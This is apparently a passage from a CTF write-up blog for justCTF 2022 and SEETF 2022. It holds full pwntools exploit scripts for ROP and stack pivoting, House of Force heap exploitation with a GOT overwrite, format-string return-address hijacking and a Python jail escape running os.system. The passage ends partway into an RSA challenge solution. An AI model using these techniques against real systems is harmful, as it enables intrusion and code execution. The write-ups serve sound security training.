in writeable region for our next main loop # (By filling the clan_tag with the writeable address) payload += p64(second_rbp-0x48) payload += b'a'*0x10 payload += p64(second_rbp) # Overwrite rbp to second_rbp payload += p64(main_loop) # Overwrite saved return address, so that it return to main loop again r.sendlineafter(b\"Nick: \", payload) r.sendlineafter(b\"Clan tag: \", p64(w_addr-0x300)) # Fill rbp-0x48 (which is now our clan_tag) to a writeable region '''Second Loop''' # Now, our goal is to leak libc address of write. The plan # - Overwrite clan_tag address to writeable region # - Pivot RBP to the new clan_tag address # - Fill clan_tag with our desired ROP, as we will ROP it to clan_tag later intermediate_rbp = w_addr-0x60 # Can be any address payload = b'a'*0x28 payload += p64(intermediate_rbp) # Overwrite clan_tag address to writeable region payload += b'a'*0x10 payload += p64(intermediate_rbp) # RBP pivot to our clan tag input # Payload for our ROP (this will overwrite the second loop return address). # - Pop write_got to rdi. Because it is pop -\u003e leave -\u003e ret, after leave, # rsp will point to clan_tag+8, rbp point to clan_tag payload += p64(pop_rdi) + p64(write_got) r.sendlineafter(b\"Nick: \", payload) # Notes that after previous leave, rsp will point to here (tag_payload+8). So, we can continue our ROP in here # What this payload do: # - Set new rbp (because write_custom method will call leave-\u003eret again). # RBP can be any address # - Ret to our write custom (Now, we got libc leak) # - Return to main loop (Directly to sub rsp, 0x50 in main_loop instruction) third_rbp = w_addr-0x50 # Can be any address tag_payload = p64(w_addr-0x50) + p64(write_custom) + p64(main_loop_sub_rsp) r.sendlineafter(b\"Clan tag: \", tag_payload) # ROP is executed, and we got our leaked libc r.recvline() leaked_write = u64(r.recvn(6).ljust(8, b'\\x00')) print(f'Leaked write: {hex(leaked_write)}') libc.base = leaked_write - libc.symbols['write'] print(f'Libc base: {hex(libc.base)}') '''Third Loop''' # Now, with one_gadget, we will gain shell with constraint r12 \u0026 r15 must be null pop_r12 = libc.base + 0x0000000000035761 # pop r12; ret pop_r15 = libc.base + 0x000000000002a6c4 # pop r15; ret execve_addr = libc.base + 0xeacec # Constraints: r12 == null, r15 == null # Final payload. Our goal: # - Overwrite clan_","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:2:3","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":" During the weekend, I played this CTF with one of my school‚Äôs friend. We managed to solve some problems, so we will try to write how we solved some of the challenge. Pwn We will explain our solution for some challenges that we solved in the pwn category. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:0:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Easy Overflow Author: Bob123 I did a check on my return address. Now you shouldn't be able to control my RIP. nc fun.chall.seetf.sg 50003 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:1:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary file, Let‚Äôs try to disassemble it. main function undefined8 main(void) { char local_28 [32]; setbuf(stdout,(char *)0x0); setbuf(stdin,(char *)0x0); puts(\"I will let you overflow me.\"); vuln(); puts(\"I will give you one more chance.\"); fgets(local_28,8,stdin); puts(local_28); return 0; } vuln function void vuln(void) { long in_stack_00000000; char local_28 [32]; gets(local_28); if (in_stack_00000000 == 0x401212) { puts(\"Good boi\\n\"); return; } puts(\"Naughty Boi\\n\"); /* WARNING: Subroutine does not return */ exit(-1); } win function void win(void) { system(\"cat flag\"); /* WARNING: Subroutine does not return */ exit(0); } Notice that on vuln method, there is a buffer overflow bug, because it used gets. However, there is a check where the return address must be 0x401212, which mean we aren‚Äôt allowed to modify the return address of the vuln method. And then after the vuln method, we were given one more chance to send our input, which will be stored in rbp-0x20. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:1:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Exploitation Plan We can‚Äôt overwrite the return address, but we actually can overwrite the saved rbp, so that we can pivot the main function stack. The checksec result also indicate that we can do GOT overwrite. Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) So, our plan is to pivot the main stack (overwrite saved rbp) to GOT['puts']+0x20, so that when we send our second input, it will overwrite it with the win function. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:1:2","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution Below is our full solver from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") elf = ELF('./easy_overflow') r = remote('fun.chall.seetf.sg', 50003) payload = b'a'*0x20+p64(elf.got['puts']+0x20)+p64(0x00000000401212) print(payload) r.sendlineafter(b'overflow me.\\n', payload) r.sendlineafter(b'more chance.\\n', p64(elf.symbols['win'])) r.interactive() Result Flag: SEE{R1P_15_K1NG_RBP_15_QU33N_31cfc2f963517cd7e1b33b84a0e6bea2} ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:1:3","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"‚Äúas‚Äù ‚Äúdf‚Äù Author: TheMythologist Why use a python interpreter when there are online ones? nc fun.chall.seetf.sg 50002 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:2:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution Let‚Äôs try to connect to the server, and turn out it is a python jail challenge. We tried to print(globals), and found out that there is the blacklist array Notes that, + and whitespace is banned. The trick to bypass this is, we can actually concat a string without using +. Example: 'as''df' will be concatted by python to 'asdf'. To bypass the whitespace, we use \\x20. And the full payload is below, where we use the help of getattr to import os. print(getattr(getattr(globals()['__builtins__'],'__im''port__')('o''s'),'sys''tem')('cat\\x20/fl*')) Result Flag: SEE{every_ctf_must_have_a_python_jail_challenge_836a4218fb09b4a0ab0412e64de74315} ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:2:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Hall Of Fame Author: @L0uisJ0shua It‚Äôs about drive, it‚Äôs about power, we stay hungry, we devour Put in the work, put in the hours and take what‚Äôs ours. Time to get to the Hall of Fame and be among the GOATS. nc fun.chall.seetf.sg 50004 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:3:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary file and libc-2.27.so. Let‚Äôs try to disassemble the binary file. main int main(void) { int iVar1; char *pcVar2; size_t sVar3; long in_FS_OFFSET; int counter; int o; char *pty; void *heap_pointer; ulong size; char *ptr; char *chunk; char option [3]; char score [64]; char word [100]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); counter = 0; heap_pointer = sbrk(0); setup_IO(); while( true ) { while( true ) { do { print_statements(counter); printf(\"Choose\u003e \"); fflush(stdout); pcVar2 = fgets(option,3,stdin); } while (pcVar2 == (char *)0x0); fflush(stdin); sVar3 = strcspn(option,\"\\n\"); option[sVar3] = '\\0'; iVar1 = atoi(option); if (iVar1 != 2) break; printf(\"\\nThe position of latest addition is at %p\\n\",heap_pointer); printf(\"The position of PUTS is at %p\\n\",puts); } if (iVar1 == 3) break; if (iVar1 == 1) { printf(\"\\nHow many points did this person score? \u003e \"); fflush(stdout); pcVar2 = fgets(score,0x40,stdin); if (pcVar2 != (char *)0x0) { fflush(stdin); sVar3 = strcspn(score,\"\\n\"); score[sVar3] = '\\0'; size = strtol(score,\u0026pty,10); ptr = (char *)malloc(size); chunk = ptr; printf(\"\\nWho is this Hall of Famer \u003e \"); fflush(stdout); fgets(word,100,stdin); fflush(stdin); *(undefined8 *)chunk = word._0_8_; *(undefined8 *)(chunk + 8) = word._8_8_; *(undefined8 *)(chunk + 0x10) = word._16_8_; *(undefined8 *)(chunk + 0x18) = word._24_8_; *(undefined8 *)(chunk + 0x20) = word._32_8_; *(undefined8 *)(chunk + 0x28) = word._40_8_; *(undefined8 *)(chunk + 0x30) = word._48_8_; *(undefined8 *)(chunk + 0x38) = word._56_8_; *(undefined8 *)(chunk + 0x40) = word._64_8_; *(undefined8 *)(chunk + 0x48) = word._72_8_; *(undefined8 *)(chunk + 0x50) = word._80_8_; *(undefined8 *)(chunk + 0x58) = word._88_8_; *(undefined4 *)(chunk + 0x60) = word._96_4_; heap_pointer = ptr; counter = counter + 1; } } else { puts(\"No choice Given!\"); } } puts(\"Exiting software...\"); if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) { return 0; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } print_statements int print_statements(int counter) { puts(\"Welcome to the Hall of Fame!\\n\"); printf(\"Number of Hall Of Famers: %d\\n\",(ulong)(uint)counter); puts(\"What brings you in here?\\n\"); puts(\"1) Add Hall of Famer\\n2) View Position\\n3) Exit\"); return 0; } So the binary will call print_statements first to print the menu, where we can add, view and exit. Let‚Äôs take a look on the main method one-by-one: do { print_statements(counter); printf(\"Choose\u003e \"); fflush(stdout); pcVar2 = fgets(option,3,stdin); } while (pcVar2 == (char *)0x0); fflush(stdin); sVar3 = strcspn(option,\"\\n\"); option[sVar3] = '\\0'; iVar1 = atoi(option); if (iVar1 != 2) break; printf(\"\\nThe position of latest addition is at %p\\n\",heap_pointer); printf(\"The position of PUTS is at %p\\n\",puts); Okay, so the second menu turn out gave us a leak of the PUTS libc address and the heap address. This help us a lot, as we don‚Äôt need to leak the libc address at all. Now, let‚Äôs check the first menu: if (iVar1 == 1) { printf(\"\\nHow many points did this person score? \u003e \"); fflush(stdout); pcVar2 = fgets(score,0x40,stdin); if (pcVar2 != (char *)0x0) { fflush(stdin); sVar3 = strcspn(score,\"\\n\"); score[sVar3] = '\\0'; size = strtol(score,\u0026pty,10); ptr = (char *)malloc(size); chunk = ptr; printf(\"\\nWho is this Hall of Famer \u003e \"); fflush(stdout); fgets(word,100,stdin); fflush(stdin); *(undefined8 *)chunk = word._0_8_; *(undefined8 *)(chunk + 8) = word._8_8_; *(undefined8 *)(chunk + 0x10) = word._16_8_; *(undefined8 *)(chunk + 0x18) = word._24_8_; *(undefined8 *)(chunk + 0x20) = word._32_8_; *(undefined8 *)(chunk + 0x28) = word._40_8_; *(undefined8 *)(chunk + 0x30) = word._48_8_; *(undefined8 *)(chunk + 0x38) = word._56_8_; *(undefined8 *)(chunk + 0x40) = word._64_8_; *(undefined8 *)(chunk + 0x48) = word._72_8_; *(undefined8 *)(chunk + 0x50) = word._80_8_; *(undefined8 *)(chunk + 0x58) = word._88_8_; *(undefined4 *)(chunk + 0x60) = word._96_4_; heap_pointer = ptr; counter = co","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:3:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Exploitation Plan So far, what we have gathered: We know the heap address and the libc base address We can control the malloc size There is heap-overflow bug (with constraint that the malloc chunk size is less than 100) There isn‚Äôt free feature The libc file is glibc 2.27 We can use house of force attack to solve this challenge. House of force is an attack, which is done by overflowing the heap‚Äôs wildernerss/top_chunk‚Äôs size into a large number, so that we can forge the malloc chunk address to address that we want. Refering to the phrack article, it requires three conditions: One overflow in a chunk that allows to overwrite the Wilderness. A call to ‚Äúmalloc()‚Äù with size field defined by designer. Another call to ‚Äúmalloc()‚Äù where data can be handled by designer. To give some context, suppose that in the current heap, we have one chunk with size 0x20, usually the layout of heap is like below ... | prev_size chunk | |-----------------| \u003c- 0x8 byte | size chunk | |-----------------| \u003c- 0x8 byte | data | | | |-----------------| \u003c- 0x10 byte |prev_sz top_chunk| |-----------------| \u003c- 0x8 byte | size top_chunk | |-----------------| \u003c- 0x8 byte ... So, on the given binary, if we allocate a size (score) less than 100, and we can allocate 100 bytes, that means we can overwrite the top_chunk size, which mean we have fulfilled the first condition. And then, because we can call malloc as much as we can, and we can control the size, that means the second and third requirements are fulfilled also. To understand better the idea behind it, this attack want to abuse this LOC in the malloc.c implementation inside glibc 2.27 method _int_malloc. use_top: /* If large enough, split off the chunk bordering the end of memory (held in av-\u003etop). Note that this is in accord with the best-fit search rule. In effect, av-\u003etop is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av-\u003etop always exists (i.e., has size \u003e= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ victim = av-\u003etop; size = chunksize (victim); if ((unsigned long) (size) \u003e= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-\u003etop = remainder; set_head (victim, nb | PREV_INUSE | (av != \u0026main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } Reading through the source code of glibc malloc implementation, when we call malloc(size), it will try to check whether there is any entries in the heap bin first. If not, then it will try to use the top_chunk, which basically goes to the above code. And then, the reason why we overwrite the chunk size with a large value (E.g. -1, which is 0xFFFFFFFFFFFFFFFF) is to ensure that if we do malloc(large_size), it will be guaranteed that the malloc will goes to the above LOC (it fulfilled this condition if ((unsigned long) (size) \u003e= (unsigned long) (nb + MINSIZE))), so that it won‚Äôt call mmap via sysmalloc (You can read the full source code in here). Assume that we have overwite the top chunk size with 0xFFFFFFFFFFFFFFFF with the heap overflow that we found before. Let‚Äôs move to the logic inside the conditional block to understand why we can pivot the malloc chunk to our desired address. remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-\u003etop = remainder; What is nb? Diving through the source code, malloc-internal.h #ifndef INTERNAL_SIZE_T # define INTERNAL_SIZE_T size_t #endif /* The corresponding word size. */ #define SIZE_SZ (sizeof (INTERNAL_SIZE_T)) malloc.c #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \u003c MINSIZE) ? \\ MINSIZE : \\ ((req","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:3:2","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution In order to implement our plan, some key notes that we need to consider: Let say that we target to overwrite address 0x808080, then we need to pivot the top_chunk to 0x808080-0x10, because the first 0x10 space will be used to store the metadata. It‚Äôs okay to send negative value to the malloc size, as it will be converted to unsigned anyway. It‚Äôs better for us to just overwrite the whole GOT table (which mean our desired_address should be smaller than the GOT first entry address), so that we don‚Äôt overwrite the GOT function with the top_chunk metadata (which can caused segfault during execution). Notes that the one_gadget returned address has contstraint where the value of [rsp+0xXX] should be nil. This means that we might need to heuristically try one-by-one which GOT function fulfill the constraint, so that we can replace it with the one_gadget address. During the CTF: We pivot the top_chunk address to 0x602000, which is the start of GOT section. We found that replacing fgets with the one_gadget fulfill the constraint. So, we carefully overwrite the GOT function which located before fgets with the correct address. So, below is our full script to do that: from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./hall_of_fame_patched\") libc = ELF(\"./libc-2.27.so\") context.binary = exe def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r) else: r = remote(\"fun.chall.seetf.sg\", 50004) return r def add(r, score, name): r.sendlineafter(b'Choose\u003e ', b'1') r.sendlineafter(b'score? \u003e ', score) r.sendlineafter(b'Famer \u003e ', name) def view(r): r.sendlineafter(b'Choose\u003e ', b'2') r.recvuntil(b'is at ') heap_pointer = int(r.recvuntil(b'\\n').strip(), 16) r.recvuntil(b'is at ') leaked_puts = int(r.recvuntil(b'\\n').strip(), 16) return heap_pointer, leaked_puts r = conn() # Overwrite top_chunk size with 0xFFFFFFFFFFFFFFFF add(r, str(0x2).encode(), b'a'*0x10+p64(-1, signed=True)+p64(-1, signed=True)) # Get heap address and libc address heap_pointer, leaked_puts = view(r) log.info(f'Leaked heap: {hex(heap_pointer)}') log.info(f'Leaked puts: {hex(leaked_puts)}') # Calculate libc base address libc.address = leaked_puts - libc.symbols['puts'] log.info(f'Libc base: {hex(libc.address)}') # Calculate top chunk address top = heap_pointer+0x18 log.info(f'Top Chunk: {hex(top)}') # Calculate the correct malloc size, so that the top_chunk will point to 0x602000 num = 0x602000-top-0x8 log.info(f'Num: {num}') # Call malloc, and after the call, top_chunk will point to 0x602000 add(r, str(num).encode(), p64(libc.address+0x10a2fc)) ''' Carefully craft payload to overwrite the GOT table, so that only fgets got replaced with the one_gadget address Notes that 0x602000 will contain the chunk metadata, so when we next call malloc and fill its content, it will start from 0x602010. So keep in mind that our payload will start from 0x602010. From observation in GDB, below is the GOT table structure [0x602018] __stack_chk_fail@GLIBC_2.4 ‚Üí 0x400716 [0x602020] printf@GLIBC_2.2.5 ‚Üí 0x7ffff7a46e40 [0x602028] strcspn@GLIBC_2.2.5 ‚Üí 0x400736 [0x602030] sbrk@GLIBC_2.2.5 ‚Üí 0x7ffff7af8160 [0x602038] fgets@GLIBC_2.2.5 ‚Üí 0x7ffff7a60ad0 ''' shell_addr = libc.address+0x10a2fc payload = p64(0) # Safe to be replaced by any bytes as it isn't the first GOT table entry address payload += p64(libc.symbols['__stack_chk_fail']) payload += p64(libc.symbols['printf']) payload += p64(libc.symbols['strcspn']) payload += p64(libc.symbols['sbrk']) payload += p64(shell_addr) # Overwrite fgets # Call malloc, and overwrite it add(r, str(10).encode(), payload) # We got our shell r.interactive() Result Flag: SEE{W3lc0mE_t0_th3_H4lL_0f_F4ME_0de280c6adb0f3da9f7ee5bd2057f8354969920c} ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:3:3","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Pokemon Battle Author: Neobeo Gary wants to challenge you to a virtual battle. Be sure to choose your pokemon well! Here's an early leak of the game, but you should know that it's incomplete and there's currently no way to win. nc fun.chall.seetf.sg 50005 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:4:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary file and the source code. Let‚Äôs check the source code // g++ pokemonbattle.cpp -w -o pokemonbattle #include \u003ciostream\u003e struct { char pokemon[13]; // longest pokemon name is 12 letters (Crabominable) virtual void Battle() { printf(\"Let the battle begin...\\n\"); // @todo: implement an actual battle printf(\"Your pokemon was defeated. You blacked out!\\n\"); } virtual void Play() { printf(\"Choose a pokemon: \"); std::cin.getline(pokemon, sizeof pokemon); printf(pokemon); printf(\", I choose you!\\n\"); Battle(); } } battler; int main() { battler.Play(); } void win() { system(\"cat flag.txt\"); } Okay, so there is win function which we could use. Also notice that there is a format string bug in the Play() method, but the payload length limit is very small, which is 12. I use GDB to have better understanding on how the binary works, and maybe found a way to send longer payload than 12, because 12 is not enough. So, first we try to set a breakpoint and inspect the GDB stack. I try to check the address inside 0x00555555558150, and below is the result Okay, so turn out, it is the battler object, which stored a pointer which point to the array of its internal method address pointer, and also the pokemon variable. After trying the format string payload several times, we found: %7$p will point to $rbp-8, which contains 0x00555555558150. If you are confused why the stack leak is in 7th parameter. Basically, in x64, if you call a function, the 6th first param will be passed via register (consecutively rdi, rsi, rdx, rcx, r8 r9), and the rest will be fetched from the stack. So, 1st is rsi, 2nd is rdx, 3rd is rcx, 4th is r8, 5th is r9, 6th is [rsp], and 7th is [rsp+8] or [rbp-8], which is the address that we got here. %8$p will point to $rbp, which contain saved rbp value of the previous call stack, which is null, so we can‚Äôt do much on this value. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:4:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Exploitation Plan Based on info that we gather before, we know that we can get the value inside 0x00555555558150, which contains 0x0000555555557d68, pointer to the Battle() method. What if we increase the last byte by 8 by overwriting the last byte to 0x70 with payload %112c%7$hhn? If you don‚Äôt understand the payload, it means ‚Äúoverwrite the last byte of the value pointed by the 7-th param (which is the battler pointer to its array of pointers of the internal methods), with the total characters those have been printed (which is 112, %112c means print 112 whitespace)‚Äù. That means, when the battler struct want to call Battle(), instead of calling Battle(), it will call the address that was pointed by 0x0000555555557d68+8, which is the Play() method. With this, the Play() method will recursively call the method itself, and basically, we have infinite loop and we can split our format string payload to multiple step. Let‚Äôs try to do that, and inspect in the GDB on what the result is. As you can see, our stack got shifted by 0x20, and as you can see, the rbp value points to the previous call stack rbp, which is not null anymore, and it contains our stack address. To recap, now our call stack is main -\u003e Play() -\u003e Play(). Another thing is, if during the second call of Play() we input the format string: %8$p, it refers to the second call rbp address, which contains value of the first call rbp. %12$p, it refers to the first call rbp address, which is null. Now, imagine that we continue the binary again, now our call stack will be main -\u003e Play() -\u003e Play() -\u003e Play(), which mean if we input: %8$p, it refers to the third call rbp address, which contains value of the second call rbp. %12$p, it refers to the second call rbp address, which contains value of the first call rbp, which is not nil. So, after the third call, we now have a stack address (A) which contains pointer to a stack address (B), where B contains a stack address ( C ). Not only that, we also have a pointer that points to (B). With the format string bug, we can overwrite the value of B to point to our desired stack address (D). And after that, when we go to the fourth call, we can get what B points to (D), and with the format string bug, overwrite the value of (D) to our desired value. To give illustration, see below: On the third call, we can use format string, to get the 3rd-RBP value (which is 2nd-RBP), and overwrite what its point (which currently contains 1st-RBP, but soon will be overwritten to target) Third call stack Before Overwrite After Overwrite 2nd-RBP via Format String 3rd-RBP | 2nd-RBP | | 2nd-RBP | target | xxxxxxxx | | xxxxxxxx | | ... | -\u003e | ... | | ... | | ... | 2nd-RBP | 1st-RBP | | target | \u003c- Now it points to target instead of 1st-RBP ------------------------------------------------------ On the fourth call, we can use format string, to get the 2nd-RBP value (which is now target), and overwrite what its point (which currently contains xxxxxxxx, but soon will be overwritten to xxxxxxxy). Fourth call stack Before Overwrite After Overwrite target via Format String 4th-RBP | 3rd-RBP | | 3rd-RBP | | ... | | ... | | ... | | ... | | ... | | ... | 3rd-RBP | 2nd-RBP | | 2nd-RBP | target | xxxxxxxx | | xxxxxxxy | | ... | -\u003e | ... | | ... | | ... | 2nd-RBP | 1st-RBP | | target | Based on the above illustration, our plan is: On the first call, we will overwrite the battler struct value which contains the address that points to the array of the internal method pointers. We will shift it by 8 (overwrite the last byte from 0x68 to 0x70). After this, when battler call Battle(), it will call Play() instead, which resulted in infinite recursive of Play() calls. On the second call, we will leak the rbp address of the first call via %8$p. On the third call, we will overwrite the second rbp value to leak-0x20-0x20-0x20+8, which is the calculated address of the return address of the fourth call. On the fourth call, we will get the second rbp value (which now points to the four","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:4:2","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution Notes that to implement our plan, we need to make sure that the last byte of the first leaked rbp is larger than 0x60, so that the second lsb won‚Äôt changed after we subtract it with 0x60. So, what we do is just re-connect to the server until the leaked rbp is \u003e 0x60. Below is our full script to implement the plan from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") while True: r = remote('fun.chall.seetf.sg', 50005) r.sendlineafter(b'pokemon: ', b'%112c%7$hhn') # Overwrite battler stored pointer, so that Battle() will be redirected to Play() r.sendlineafter(b'pokemon: ', b'%8$p') # Leak the stack address (precisely, the first RBP address) out = r.recvuntil(b'\\n') leak = int(out.split(b',')[0][-2:], 16) if leak \u003e 0x60: break target = leak-0x20-0x20-0x20+8 # Our target is the (future) fourth RBP + 8 (fourth call saved return address) payload = f'%{target}c%8$hhn'.encode() # Third call, we overwrite the 2nd-RBP value from first RBP to (future) fourth RBP + 8 r.sendlineafter(b'pokemon: ', payload) payload = f'%{0xc6}c%16$hhn'.encode() # Fourth call, we get the 2nd-RBP (which is now points to fourth saved return address), and overwrite its last byte, so that it points to win() r.sendlineafter(b'pokemon: ', payload) payload = b'%104c%7$hhn' # Fifth call, fix the battler stored pointer, so that Battle() will call the real Battle() r.sendlineafter(b'pokemon: ', payload) flag = r.recvuntil(b'\\n') # The fifth call will continue to fourth call, and the fourth call will return to win() instead to the third call print(f'Flag: {flag.decode()}') Result Flag: SEE{did_you_choose_missingno_b6d3c6594dcc332c7e22d231d10b8b8b} Crypto We managed to solve two challs on this category ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:4:3","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Lost Modulus Author: coff33 I've hidden my flag as a modulus, I'm sure no one will be able to retrieve it. nc fun.chall.seetf.sg 30004 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:5:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Initial Analysis We were given one file which is the code of the running server. from Crypto.Util.number import getPrime, long_to_bytes, bytes_to_long with open(\"flag.txt\", \"rb\") as f: FLAG = f.read() n = bytes_to_long(FLAG) #make sure i have a big modulus while n.bit_length() \u003c 2048: n *= n def encrypt(m1, m2): e = getPrime(256) assert m1.bit_length() \u003e= 1600 and long_to_bytes(m1).startswith(b\"SEE{\"), 'first message must be at least 1600 bits and begin with \"SEE{\"' assert 500 \u003c= m2.bit_length() \u003c= 600, 'second message must be within 500 to 600 bits' return pow(m1, e, n), pow(m2, e, n) def main(): try: m1 = int(input(\"Message 1 (as integer) : \").strip()) m2 = int(input(\"Message 2 (as integer) : \").strip()) c1, c2 = encrypt(m1, m2) print(f\"\\nCiphers: \\n{[c1,c2]}\") except Exception as e: print(e) if __name__ == '__main__': main() So, reading through the code, the goal is we need to retrieve $N$, where $N$ is the flag. And then the server will gave us chance to encrypt two message. $e$ is a 256-prime. There is constraint, where: First message bits \u003e= 1600, and must start with SEE{ Second message bits range is 500-600 bits inclusive The server will return both of the encryption result. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:5:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Exploitation Plan We don‚Äôt know $e$ and $N$ value, and our task is to retrieve $N$. Suppose that we have message $m$, and $m_1=m^3$, $m_2=m$. Consider this equations. $$ \\begin{align} \\tag{1} c_1 \u0026\\equiv m_1^{e} \\mod N \\\\ c_1 \u0026\\equiv (m^3)^{e} \\mod N \\\\ c_1 \u0026= m^{3e} + k_1N \\\\ \\end{align} $$ where $k_1$ is unknown constant. Now, check out this equation. $$ \\begin{align*} c_2 \u0026\\equiv m_2^{e} \\mod N \\\\ c_2 \u0026\\equiv m^{e} \\mod N \\\\ c_2 \u0026= m^{e} + k_2N \\\\ \\end{align*} $$ Notice that if we cubed the $c_2$, $$ \\begin{align} \\tag{2} (c_2)^3 \u0026\\equiv (m^{e})^3 \\mod N \\\\ (c_2)^3 \u0026\\equiv m^{3e} \\mod N \\\\ (c_2)^3 \u0026= m^{3e} + k_2N \\\\ \\end{align} $$ we will get another equation, where $k_2$ is unknown constant. Notice that we can eliminate first and second equation to finally get the final equation $$ \\begin{align} \\tag{3} (c_2)^3-c_1 = k_3N \\end{align} $$ where $k3$ is unknown constant ($k2-k1$). Notes that, we can connect to the server multiple times, and the $N$ will remain constant as it is the flag. So, we can retrieve multiple value of $kN$, and then we can simply $\\gcd$ them to retrieve $N$, as their greatest shared common factor will be $N$. Bypassing the constraint Remember that we have constraints where the $m_1$ need to start with SEE{ and has \u003e= 1600 bits and $m_2$ bits need to be inclusively in range 500-600 bits. The trick is: We can generate any string start with SEE{ and the bit length is ~1650-1655 bits. Cube root it and ceil it. Use this as the $m_2$ value. It should be around ~555 bits, which fulfilled our constraint. And then we can simply cubed it again, so that we can get a value, which is cubed and start with SEE{. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:5:2","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution Below is the script (sage) that we used to solve the chall. Notes that after retrieving the $N$, we need to recursively square root the value until the flag is shown, because the server is multiplying the $N$ with itself until the bit length is \u003e= 2048 bits. Base is the floating number of string 